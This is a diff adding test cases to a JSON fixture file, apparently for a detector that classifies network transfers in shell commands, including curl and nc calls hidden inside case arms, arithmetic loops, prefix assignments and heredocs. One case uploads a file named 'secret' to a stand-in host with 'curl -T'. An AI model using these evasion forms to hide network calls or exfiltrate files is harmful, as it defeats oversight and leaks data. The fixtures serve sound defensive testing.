@@ -2769,6 +2769,93 @@
    "transfer": null
   },
   {
+   "command": "echo \"$(case x in x) curl https://actual.example/a;; esac)\"",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for ((i=0;i<1;i+=$(curl https://never.example/a; echo 1))); do break; done; curl https://actual.example/b",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for ((i=0;i<1;i+=$(curl https://actual.example/a; echo 1))); do :; done",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "for ((i=0;i<0;i+=$(curl https://never.example/a))); do :; done; curl https://actual.example/b",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "in",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "_=1 curl -T secret https://actual.example/up",
+   "transfer": {
+    "tool": "curl",
+    "endpoints": [
+     {
+      "direction": "out",
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "bash <<EOF\nnc actual.example 80\nEOF",
+   "transfer": {
+    "tool": "nc",
+    "endpoints": [
+     {
+      "host": "actual.example",
+      "resolved_host": "actual.example",
+      "address": "public"
+     }
+    ]
+   }
+  },
+  {
+   "command": "wc -c /tmp/x; cd /tmp || curl https://never.example/a",
+   "transfer": null
+  },
+  {
    "command": "git push origin main",
    "transfer": null
   },
